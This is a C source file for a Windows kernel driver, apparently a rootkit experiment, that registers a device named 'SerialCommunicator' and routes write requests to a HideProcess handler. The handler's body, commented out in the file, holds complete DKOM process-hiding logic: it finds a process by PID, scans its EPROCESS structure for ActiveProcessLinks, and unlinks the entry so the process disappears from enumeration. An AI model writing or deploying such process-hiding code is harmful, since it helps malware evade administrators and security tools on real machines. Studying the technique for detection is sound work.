#include <ntifs.h>
#include <ntddk.h>
#include <ntstrsafe.h>

typedef unsigned int uint;
//DRIVER_INITIALIZE DriverEntry;

#if defined(UNICODE)
# define RtlStringCbPrintf RtlStringCbPrintfA
#else
# define RtlStringCbPrintf RtlStringCbPrintfW
#endif

#pragma region functions declerations
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING pRegistryPath);
NTSTATUS HideProcess(PDEVICE_OBJECT pDeviceObj, PIRP irp);
VOID Unload(PDRIVER_OBJECT pDriverObj);
NTSTATUS NotSupportedOperation(PDEVICE_OBJECT pDeviceObj, PIRP irp);
#pragma endregion

#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, HideProcess) 
#pragma alloc_text(PAGE, NotSupportedOperation)
#pragma alloc_text(PAGE, Unload) 


#pragma region constants
UNICODE_STRING Autograph = RTL_CONSTANT_STRING(L"BASH"); // L because its a pointer to wchar_t
#pragma endregion

#pragma region global vars
UNICODE_STRING DeviceName; // = RTL_CONSTANT_STRING(L"\\Device\\DKOM_Driver");
UNICODE_STRING dosDeviceName; // = RTL_CONSTANT_STRING(L"\\DosDevices\\DKOM_Driver");
PDEVICE_OBJECT DeviceObjPtr;
#pragma endregion

VOID Unload(PDRIVER_OBJECT pDriverObj)
{
	IoDeleteSymbolicLink(&dosDeviceName); // delete link netween dos name and NT name
	IoDeleteDevice(pDriverObj->DeviceObject);
}

// this is the "MJ_WRITE" method:
NTSTATUS HideProcess(PDEVICE_OBJECT pDeviceObj, PIRP irp) // pointer to device object and pointer to irp (IO request packet)
{
	UNREFERENCED_PARAMETER(pDeviceObj);

//	irp->IoStatus.Information = 0; // if not successful
//
//#pragma region get passed data
//	PVOID buffer = MmGetSystemAddressForMdlSafe(irp->MdlAddress, NormalPagePriority); // get non paged memory => this is the data passed with the request (pid)
//	if(!buffer)
//	{
//		irp->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;
//		IoCompleteRequest(irp, IO_NO_INCREMENT);
//		return STATUS_INSUFFICIENT_RESOURCES;
//	}
//
//	DbgPrint("Process ID: %d", *(PHANDLE)buffer);
//#pragma endregion
//
//#pragma region try to access process
//	PEPROCESS Process;
//	NTSTATUS status = PsLookupProcessByProcessId(*(PHANDLE)buffer, &Process);
//	if(!NT_SUCCESS(status)) // if fails
//	{
//		DbgPrint("Error: Unable to open process object (%#x)", status);
//		irp->IoStatus.Status = status;
//		IoCompleteRequest(irp, IO_NO_INCREMENT);
//		return STATUS_INSUFFICIENT_RESOURCES;
//	}
//#pragma endregion
//
//	DbgPrint("EPROCESS address: %#x", Process);
//	PULONG ptr = (PULONG)Process;
//
//#pragma region scan EPROCESS for pid
//	// Scan the EPROCESS structure for the PID
//	ULONG offset = 0;
//	PLIST_ENTRY CurrListEntry; //PrevListEntry, NextListEntry;
//	for(short i = 0; i < (short)512; i++)
//	{
//		if(ptr[i] == *((PULONG)buffer))
//		{
//			offset = (ULONG)&ptr[i + 1] - (ULONG)Process; // ActiveProcessLinks is located next to the PID
//			// after it will work try the next:
//			CurrListEntry = (PLIST_ENTRY)((PUCHAR)&ptr[i + 1]); //(PUCHAR)Process + (ULONG)&ptr[i + 1] - (ULONG)Process
//			DbgPrint("ActiveProcessLinks offset: %#x", offset);
//			break;
//		}
//	}
//
//	if(!offset) // not found
//	{
//		irp->IoStatus.Status = STATUS_UNSUCCESSFUL;
//		IoCompleteRequest(irp, IO_NO_INCREMENT);
//		return STATUS_UNSUCCESSFUL;
//	}
//#pragma endregion
//
//	CurrListEntry = (PLIST_ENTRY)((PUCHAR)Process + offset); // Get the ActiveProcessLinks address
//
//#pragma region remove EPROCESS object
//	// PrevListEntry = CurrListEntry->Blink;
//	// NextListEntry = CurrListEntry->Flink;
//	// Unlink the target process from other processes (unlink from list):
//
//	CurrListEntry->Blink->Flink = CurrListEntry->Flink; // point prevEPROCESS Flink to nextEPROCESS
//	CurrListEntry->Flink->Blink = CurrListEntry->Blink; // point nextEPROCESS Blink to prevEPROCESS
//
//	CurrListEntry->Flink = CurrListEntry; // Point Flink and Blink to self to prevent BSOD
//	CurrListEntry->Blink = CurrListEntry;
//
//	ObDereferenceObject(Process); // Dereference the target process -> decrease the reference counter
//#pragma endregion
//
//	irp->IoStatus.Information = sizeof(HANDLE); // if successful there is information
//	irp->IoStatus.Status = STATUS_SUCCESS;
//
//	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS NotSupportedOperation(PDEVICE_OBJECT pDeviceObj, PIRP irp)
{
	UNREFERENCED_PARAMETER(pDeviceObj);

	//DbgPrint("Not Supported Operation Called\n");
	DbgPrintEx(DPFLTR_CONFIG_ID, DPFLTR_ERROR_LEVEL, "Not Supported Operation Called\n");
	//DbgPrint("not supported Major Function (%#x)\n", IoGetCurrentIrpStackLocation(irp)->MajorFunction);
	WCHAR buff[50];
	// the next method is like sprinf: RtlStringCbPrintf
	//if(!NT_SUCCESS(RtlStringCbPrintf(buff, 50 * sizeof(WCHAR), L"Major function: %lu\n", IoGetCurrentIrpStackLocation(irp)->MajorFunction))) // get major function code and cast to string
	//	DbgPrint("Could not cast major function to string\n");
	//else
	//	DbgPrint((PCSTR)buff); // Dbgprint the above
	// sprintf(buff, "Major function: %lu\n", IoGetCurrentIrpStackLocation(irp)->MajorFunction); // get major function code and cast to string
	
	return STATUS_NOT_SUPPORTED;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING pRegistryPath)
{
	//DbgPrint("0");
	//__asm
	//{
	//	nop
	//	nop
	//	nop
	//	nop
	//	nop
	//	nop
	//	nop
	//	nop
	//}; // for debugging (finding the start of the method in assembly)

	//UNREFERENCED_PARAMETER(pDeviceObject);;
	UNREFERENCED_PARAMETER(pRegistryPath);

	//RtlInitUnicodeString(&DeviceName, L"\\Devices\\DKOM"); // copy unicode string
	//RtlInitUnicodeString(&dosDeviceName, L"\\DosDevices\\DKOM");
	KIRQL currIrql = KeGetCurrentIrql();
	DbgPrintEx(DPFLTR_CONFIG_ID, DPFLTR_ERROR_LEVEL, "irql: %d", currIrql);
	DbgPrintEx(DPFLTR_CONFIG_ID, DPFLTR_INFO_LEVEL, "1");
	RtlInitUnicodeString(&DeviceName, L"\\Device\\SerialCommunicator"); // copy unicode string
	RtlInitUnicodeString(&dosDeviceName, L"\\DosDevices\\SerialCommunicator");
	NTSTATUS createDevStatus = IoCreateDevice(pDriverObj, 0, &DeviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &DeviceObjPtr);
	if (!NT_SUCCESS(createDevStatus))
	{
		DbgPrintEx(DPFLTR_CONFIG_ID, DPFLTR_ERROR_LEVEL, "Error: Unable to create device object (%#010x)", createDevStatus);
		//DbgPrint("Error: Unable to create device object (%d)", createDevStatus);
		return createDevStatus;
	}
	IoCreateSymbolicLink(&dosDeviceName, &DeviceName); // create symbolic link between the dos name and NT name in the object manager
	// With this Symbolic link, we can open a handle using the string “\\.\myDevice”
	pDriverObj->DriverUnload = Unload;
	for(/*uint*/ short i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
	{
		DbgPrint("6:%d", i);
		pDriverObj->MajorFunction[i] = NotSupportedOperation; // handle all not supported operations
	}
	pDriverObj->MajorFunction[IRP_MJ_WRITE] = HideProcess;
	DeviceObjPtr->Flags &= ~DO_DEVICE_INITIALIZING;
	DeviceObjPtr->Flags |= DO_DIRECT_IO; // using direct IO
	return STATUS_SUCCESS;
}